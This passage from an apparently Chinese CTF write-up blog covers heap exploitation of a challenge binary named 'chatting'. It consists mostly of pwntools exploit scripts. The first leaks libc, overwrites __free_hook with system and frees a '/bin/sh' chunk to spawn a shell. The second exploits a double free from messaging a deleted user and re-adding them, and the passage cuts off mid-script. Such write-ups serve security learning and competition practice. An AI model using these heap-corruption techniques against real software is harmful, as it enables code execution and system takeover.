</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">mydbg</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">	<span class="n">gdb</span><span class="o">.</span><span class="n">attach</span><span class="p">(</span><span class="n">p</span><span class="p">,</span><span class="s2">&#34;b *$rebase(0x000321F)</span><span class="se">\n</span><span class="s2"> decompiler connect ida --host 10.193.253.113 --port 3662&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">	<span class="n">pause</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">menu</span><span class="p">(</span><span class="n">choice</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">	<span class="n">ru</span><span class="p">(</span><span class="s2">&#34;Choose action (add, delete, switch, message, read, listuser, exit): &#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">	<span class="n">sl</span><span class="p">(</span><span class="n">choice</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">add</span><span class="p">(</span><span class="n">usrname</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">	<span class="n">menu</span><span class="p">(</span><span class="s2">&#34;add&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">	<span class="n">ru</span><span class="p">(</span><span class="s2">&#34;Enter new username:&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">	<span class="n">sl</span><span class="p">(</span><span class="n">usrname</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">delete</span><span class="p">(</span><span class="n">usrname</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">	<span class="n">menu</span><span class="p">(</span><span class="s2">&#34;delete&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">	<span class="n">ru</span><span class="p">(</span><span class="s2">&#34;Enter username to delete:&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">	<span class="n">sl</span><span class="p">(</span><span class="n">usrname</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">switch_func</span><span class="p">(</span><span class="n">usrname</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">	<span class="n">menu</span><span class="p">(</span><span class="s2">&#34;switch&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">	<span class="n">ru</span><span class="p">(</span><span class="s2">&#34;Enter username to switch to: &#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">	<span class="n">sl</span><span class="p">(</span><span class="n">usrname</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">message_func</span><span class="p">(</span><span class="n">usrname</span><span class="p">,</span><span class="n">size</span><span class="p">,</span><span class="n">content</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">	<span class="n">menu</span><span class="p">(</span><span class="s2">&#34;message&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">	<span class="n">ru</span><span class="p">(</span><span class="s2">&#34;To: &#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">	<span class="n">sl</span><span class="p">(</span><span class="n">usrname</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">	<span class="n">ru</span><span class="p">(</span><span class="s2">&#34;Message size:&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">	<span class="n">sl</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">size</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">	<span class="n">ru</span><span class="p">(</span><span class="s2">&#34;Content:&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">	<span class="n">sl</span><span class="p">(</span><span class="n">content</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">read_func</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">	<span class="n">menu</span><span class="p">(</span><span class="s2">&#34;read&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">list_func</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">	<span class="n">menu</span><span class="p">(</span><span class="s2">&#34;listuser&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">ru</span><span class="p">(</span><span class="s2">&#34;Enter new username:&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">sl</span><span class="p">(</span><span class="s2">&#34;chuwei1&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">message_func</span><span class="p">(</span><span class="s2">&#34;chuwei1&#34;</span><span class="p">,</span><span class="mh">0x100</span><span class="p">,</span><span class="s2">&#34;a&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">add</span><span class="p">(</span><span class="s2">&#34;chuwei2&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">7</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">	<span class="n">message_func</span><span class="p">(</span><span class="s2">&#34;chuwei2&#34;</span><span class="p">,</span><span class="mh">0x100</span><span class="p">,</span><span class="s2">&#34;a&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">delete</span><span class="p">(</span><span class="s2">&#34;chuwei2&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">add</span><span class="p">(</span><span class="s2">&#34;chuwei2&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">delete</span><span class="p">(</span><span class="s2">&#34;chuwei1&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">read_func</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">libc_base</span><span class="o">=</span><span class="n">uu64</span><span class="p">()</span><span class="o">-</span><span class="mi">96</span><span class="o">-</span><span class="mh">0x10</span><span class="o">-</span><span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;__malloc_hook&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="c1">#libc_base=uu64()-0x219ce0</span>
</span></span><span class="line"><span class="cl"><span class="n">lg</span><span class="p">(</span><span class="s2">&#34;libc_base&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">add</span><span class="p">(</span><span class="s2">&#34;chuwei1&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mh">0x64</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">	<span class="n">message_func</span><span class="p">(</span><span class="s2">&#34;chuwei2&#34;</span><span class="p">,</span><span class="mh">0x30</span><span class="p">,</span><span class="s2">&#34;aaaaaaaaaaaa&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">9</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">	<span class="n">message_func</span><span class="p">(</span><span class="s2">&#34;chuwei1&#34;</span><span class="p">,</span><span class="mh">0x200</span><span class="p">,</span><span class="s2">&#34;aaaaaaaaaaaa&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">add</span><span class="p">(</span><span class="s2">&#34;chuwei3&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">delete</span><span class="p">(</span><span class="s2">&#34;chuwei1&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">add</span><span class="p">(</span><span class="s2">&#34;chuwei1&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">7</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">	<span class="n">message_func</span><span class="p">(</span><span class="s2">&#34;chuwei1&#34;</span><span class="p">,</span><span class="mh">0x200</span><span class="p">,</span><span class="s2">&#34;aaaaaaaaaaaa&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">message_func</span><span class="p">(</span><span class="s2">&#34;chuwei3&#34;</span><span class="p">,</span><span class="mh">0x200</span><span class="p">,</span><span class="s2">&#34;aaaaaaaaaaaa&#34;</span><span class="p">)</span> <span class="c1">#prev</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">message_func</span><span class="p">(</span><span class="s2">&#34;chuwei2&#34;</span><span class="p">,</span><span class="mh">0x200</span><span class="p">,</span><span class="s2">&#34;a&#34;</span><span class="o">*</span><span class="mh">0x100</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">add</span><span class="p">(</span><span class="s2">&#34;chuwei4&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">message_func</span><span class="p">(</span><span class="s2">&#34;chuwei4&#34;</span><span class="p">,</span><span class="mh">0x200</span><span class="p">,</span><span class="s2">&#34;a&#34;</span><span class="o">*</span><span class="mh">0x100</span><span class="p">)</span>   <span class="c1">#vitim</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">delete</span><span class="p">(</span><span class="s2">&#34;chuwei1&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">add</span><span class="p">(</span><span class="s2">&#34;chuwei1&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">delete</span><span class="p">(</span><span class="s2">&#34;chuwei4&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">add</span><span class="p">(</span><span class="s2">&#34;chuwei4&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">delete</span><span class="p">(</span><span class="s2">&#34;chuwei3&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">add</span><span class="p">(</span><span class="s2">&#34;chuwei3&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">message_func</span><span class="p">(</span><span class="s2">&#34;chuwei3&#34;</span><span class="p">,</span><span class="mh">0x200</span><span class="p">,</span><span class="s2">&#34;aaaaaaaaaaaa&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">delete</span><span class="p">(</span><span class="s2">&#34;chuwei2&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">add</span><span class="p">(</span><span class="s2">&#34;chuwei2&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">mydbg</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="n">message_func</span><span class="p">(</span><span class="s2">&#34;chuwei2&#34;</span><span class="p">,</span><span class="mh">0x410</span><span class="p">,</span><span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x00</span><span class="s2">&#34;</span><span class="o">*</span><span class="mh">0x200</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x210</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x211</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">libc_base</span><span class="o">+</span><span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;__free_hook&#39;</span><span class="p">]))</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">message_func</span><span class="p">(</span><span class="s2">&#34;chuwei2&#34;</span><span class="p">,</span><span class="mh">0x200</span><span class="p">,</span><span class="s2">&#34;/bin/sh</span><span class="se">\x00</span><span class="s2">&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">message_func</span><span class="p">(</span><span class="s2">&#34;chuwei2&#34;</span><span class="p">,</span><span class="mh">0x200</span><span class="p">,</span><span class="n">p64</span><span class="p">(</span><span class="n">libc_base</span><span class="o">+</span><span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;system&#39;</span><span class="p">]))</span>
</span></span><span class="line"><span class="cl"><span class="n">delete</span><span class="p">(</span><span class="s2">&#34;chuwei2&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span></span></span></code></pre></td></tr></table>
</div>
</div><p><img loading="lazy" src='https://cdn.jsdelivr.net/gh/chuw3i/picodemo@main/img/202505262111729.png' alt="image-20231217110436821"></p>
<h4 class="heading-element" id="解法二-1"><span>解法二</span>
  <a href="#%e8%a7%a3%e6%b3%95%e4%ba%8c-1" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h4><p>向一个删除过的用户发送消息时候，多次申请message chunk 会导致释放其中的message chunk，然后再次add 该用户，会导致一个double free。可以利用这点构造出一个重叠堆块，具体构造脚本如下：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span><span class="lnt">52
</span><span class="lnt">53
</span><span class="lnt">54
</span><span class="lnt">55
</span><span class="lnt">56
</span><span class="lnt">57
</span><span class="lnt">58
</span><span class="lnt">59
</span><span class="lnt">60
</span><span class="lnt">61
</span><span class="lnt">62
</span><span class="lnt">63
</span><span class="lnt">64
</span><span class="lnt">65
</span><span class="lnt">66
</span><span class="lnt">67
</span><span class="lnt">68
</span><span class="lnt">69
</span><span class="lnt">70
</span><span class="lnt">71
</span><span class="lnt">72
</span><span class="lnt">73
</span><span class="lnt">74
</span><span class="lnt">75
</span><span class="lnt">76
</span><span class="lnt">77
</span><span class="lnt">78
</span><span class="lnt">79
</span><span class="lnt">80
</span><span class="lnt">81
</span><span class="lnt">82
</span><span class="lnt">83
</span><span class="lnt">84
</span><span class="lnt">85
</span><span class="lnt">86
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span><span class="o">*</span>
</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="o">.</span><span class="n">arch</span><span class="o">=</span><span class="s1">&#39;amd64&#39;</span>
</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="o">.</span><span class="n">log_level</span><span class="o">=</span><span class="s1">&#39;debug&#39;</span>
</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">=</span><span class="n">process</span><span class="p">(</span><span class="s1">&#39;./chatting&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">libc</span><span class="o">=</span><span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;/lib/x86_64-linux-gnu/libc.so.6&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">s</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span> <span class="p">:</span> <span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">sl</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span> <span class="p">:</span> <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">sa</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">text</span><span class="p">,</span> <span class="n">data</span> <span class="p">:</span> <span class="n">p</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="n">text</span><span class="p">,</span> <span class="n">data</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">sla</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">text</span><span class="p">,</span> <span class="n">data</span> <span class="p">:</span> <span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="n">text</span><span class="p">,</span> <span class="n">data</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">r</span> <span class="o">=</span> <span class="k">lambda</span> <span class="p">:</span> <span class="n">p</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="n">rn</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">x</span>  <span class="p">:</span> <span class="n">p</span><span class="o">.</span><span class="n">recvn</span><span class="p">(</span><span class="n">x</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">ru</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">text</span> <span class="p">:</span> <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="n">text</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">dbg</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">text</span><span class="o">=</span><span class="kc">None</span>  <span class="p">:</span> <span class="n">gdb</span><span class="o">.</span><span class="n">attach</span><span class="p">(</span><span class="n">p</span><span class="p">,</span> <span class="n">text</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">uu32</span> <span class="o">=</span> <span class="k">lambda</span> <span class="p">:</span> <span class="n">u32</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;</span><span class="se">\xff</span><span class="s2">&#34;</span><span class="p">)[</span><span class="o">-</span><span class="mi">4</span><span class="p">:]</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">))</span>
</span></span><span class="line"><span class="cl"><span class="n">uu64</span> <span class="o">=</span> <span class="k">lambda</span> <span class="p">:</span> <span class="n">u64</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x7f</span><span class="s2">&#34;</span><span class="p">)[</span><span class="o">-</span><span class="mi">6</span><span class="p">:]</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x00</span><span class="s2">&#34;</span><span class="p">))</span>
</span></span><span class="line"><span class="cl"><span class="n">lg</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">s</span> <span class="p">:</span> <span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s1">&#39;</span><span class="se">\033</span><span class="s1">[1;31;40m </span><span class="si">%s</span><span class="s1"> --&gt; 0x</span><span class="si">%x</span><span class="s1"> </span><span class="se">\033</span><span class="s1">[0m&#39;</span> <span class="o">%</span> <span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="nb">eval</span><span class="p">(</span><span class="n">s</span><span class="p">)))</span>
</span></span><span class="line"><span class="cl"><span class="n">pr</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">s</span> <span class="p">:</span> <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;</span><span class="se">\033</span><span class="s1">[1;31;40m </span><span class="si">%s</span><span class="s1"> --&gt; 0x</span><span class="si">%x</span><span class="s1"> </span><span class="se">\033</span><span class="s1">[0m&#39;</span> <span class="o">%</span> <span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="nb">eval</span><span class="p">(</span><span class="n">s</span><span class="p">)))</span>
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">mydbg</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">	<span class="n">gdb</span><span class="o">.</span><span class="n">attach</span><span class="p">(</span><span class="n">p</span><span class="p">,</span><span class="s2">&#34;b *$rebase(0x000321F)&#34;</span><span class="p">)</span><span class="c1">#\n decompiler connect ida --host 10.193.253.113 --port 3662&#34;)</span>
</span></span><span class="line"><span class="cl">	<span class="n">pause</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">menu</span><span class="p">(</span><span class="n">choice</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">	<span class="n">ru</span><span class="p">(</span><span class="s2">&#34;Choose action (add, delete, switch, message, read, listuser, exit): &#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">	<span class="n">sl</span><span class="p">(</span><span class="n">choice</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">add</span><span class="p">(</span><span class="n">usrname</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">	<span class="n">menu</span><span class="p">(</span><span class="s2">&#34;add&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">	<span class="n">ru</span><span class="p">(</span><span class="s2">&#34;Enter new username:&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">	<span class="n">sl</span><span class="p">(</span><span class="n">usrname</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">delete</span><span class="p">(</span><span class="n">usrname</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">	<span class="n">menu</span><span class="p">(</span><span class="s2">&#34;delete&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">	<span class="n">ru</span><span class="p">(</span><span class="s2">&#34;Enter username to delete:&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">	<span class="n">sl</span><span class="p">(</span><span class="n">usrname</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">switch_func</span><span class="p">(</span><span class="n">usrname</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">	<span class="n">menu</span><span class="p">(</span><span class="s2">&#34;switch&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">	<span class="n">ru</span><span class="p">(</span><span class="s2">&#34;Enter username to switch to: &#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">	<span class="n">sl</span><span class="p">(</span><span class="n">usrname</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">message_func</span><span class="p">(</span><span class="n">usrname</span><span class="p">,</span><span class="n">size</span><span class="p">,</span><span class="n">content</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">	<span class="n">menu</span><span class="p">(</span><span class="s2">&#34;message&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">	<span class="n">ru</span><span class="p">(</span><span class="s2">&#34;To: &#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">	<span class="n">sl</span><span class="p">(</span><span class="n">usrname</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">	<span class="n">ru</span><span class="p">(</span><span class="s2">&#34;Message size:&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">	<span class="n">sl</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">content</span><span class="p">)))</span>
</span></span><span class="line"><span class="cl">	<span class="n">ru</span><span class="p">(</span><span class="s2">&#34;Content:&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">	<span class="n">sl</span><span class="p">(</span><span class="n">content</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">read_func</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">	<span class="n">menu</span><span class="p">(</span><span class="s2">&#34;read&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">list_func</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">	<span class="n">menu</span><span class="p">(</span><span class="s2">&#34;listuser&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">ru</span><span class="p">(</span><span class="s2">&#34;Enter new username:&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">sl</span><span class="p">(</span><span class="s2">&#34;chuwwei1&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">add</span><span class="p">(</span><span class="s2">&#34;cc&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">add</span><span class="p">(</span><span class="s2">&#34;bb&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">add</span><span class="p">(</span><span class="s1">&#39;aa&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">3</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">	<span class="n">message_func</span><span class="p">(</span><span class="s1">&#39;bb&#39;</span><span class="p">,</span> <span class="mh">0x78</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;a&#39;</span> <span class="o">*</span> <span class="mh">0x78</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">delete</span><span class="p">(</span><span class="s2">&#34;bb&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">add</span><span class="p">(</span><span class="s2">&#34;bb&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">delete</span><span class="p">(</span><span class="s2">&#34;aa&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">message_func</span><span class="p">(</span><span class="s1">&#39;aa&#39;</span><span class="p">,</span> <span class="mh">0x78</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;a&#39;</span> <span class="o">*</span> <span class="mh">0x78</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">message_func</span><span class="p">(</span><span class="s1">&#39;aa&#39;</span><span class="p">,</span> <span class="mh">0x78</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;a&#39;</span> <span class="o">*</span> <span class="mh">0x78</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">message_func</span><span class="p">(</span><span class="s1">&#39;aa&#39;</span><span class="p">,</span> <span class="mh">0x78</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;a&#39;</span> <span class="o">*</span> <span class="mh">0x78</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
